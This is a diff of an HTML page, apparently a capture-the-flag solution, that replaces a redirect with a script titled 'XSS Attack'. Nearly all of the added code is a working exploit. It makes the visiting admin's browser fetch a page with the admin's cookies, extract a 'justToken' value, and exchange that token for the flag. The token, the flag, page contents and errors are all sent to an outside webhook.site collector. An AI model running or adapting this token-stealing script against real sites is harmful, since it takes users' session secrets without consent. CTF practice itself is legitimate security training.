@@ -1,11 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta http-equiv="refresh" content="1; url=http://fnxek7pz6fqgwxn9a8lb214iuqlpd2.simpletasks.web.jctf.pro/tasks/preview/0/0?">
+    <title>XSS Attack</title>
 </head>
 <body>
-  <script>
-    fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?step=redirecting').catch(() => {});
-  </script>
+    <script>
+        // 發送開始信號
+        fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?step=start').catch(() => {});
+        
+        // 等待一秒確保admin已登入
+        setTimeout(() => {
+            // 直接fetch admin的token頁面
+            fetch('/tasks/preview/0/0', {
+                method: 'GET',
+                credentials: 'include'  // 包含cookies
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Response not ok: ' + response.status);
+                }
+                return response.text();
+            })
+            .then(data => {
+                // 提取token
+                const tokenMatch = data.match(/justToken\{([^}]+)\}/);
+                if (tokenMatch && tokenMatch[1]) {
+                    const token = tokenMatch[1];
+                    
+                    // 發送token到webhook
+                    fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?token=' + encodeURIComponent(token))
+                        .catch(() => {});
+                    
+                    // 也可以嘗試直接訪問flag endpoint
+                    fetch('/token?token=' + encodeURIComponent(token))
+                        .then(r => r.text())
+                        .then(flag => {
+                            fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?flag=' + encodeURIComponent(flag))
+                                .catch(() => {});
+                        })
+                        .catch(() => {});
+                } else {
+                    // 如果沒找到token，發送原始內容用於調試
+                    fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?debug=' + encodeURIComponent(data.substring(0, 200)))
+                        .catch(() => {});
+                }
+            })
+            .catch(error => {
+                // 發送錯誤信息
+                fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?error=' + encodeURIComponent(error.message))
+                    .catch(() => {});
+            });
+        }, 1000);
+    </script>
 </body>
 </html>
